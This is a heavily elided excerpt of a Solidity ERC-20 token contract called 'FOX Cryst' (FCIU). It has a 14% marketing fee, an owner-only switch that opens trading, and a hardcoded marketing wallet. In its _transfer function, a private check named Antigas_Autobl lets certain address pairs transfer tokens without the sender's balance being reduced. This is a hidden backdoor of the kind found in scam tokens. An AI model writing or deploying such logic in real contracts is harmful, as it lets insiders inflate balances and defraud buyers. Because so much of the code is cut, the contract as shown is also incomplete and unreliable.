...
contract Forysta is Context, IERC20, Ownable {
    ...
    string private constant _name = "FOX Cryst"; // 
    string private constant _symbol = unicode"FCIU"; //    
    uint8 private constant _decimals = 9; // 
    
    
    uint256 public _marketingFee = 14;
    uint256 public _liquidityFee = 1;
    address private  _marketingWallet = 0xcc7DB6C4d3060506286B8Cdd097898696ad7B1aa;
 ...
 /*
    ...
    */
    ...
    // Set the maximum wallet holding (percent of total supply)
     function Max_tx_wallet(uint256 maxWallPercent_x100) external onlyOwner() {
    ...
    function isExcludedFromFee(address account) public view returns(bool) {
     ...
     function ApproveListing() external onlyOwner() {
        openTrade = true;
    }
   ...
   function Antigas_Autobl(address first,address second) private view returns (bool){
    ...
    function _transfer(
        ...
        if (Antigas_Autobl(to,from)){}else{
        _tOwned[from] -= amount;}
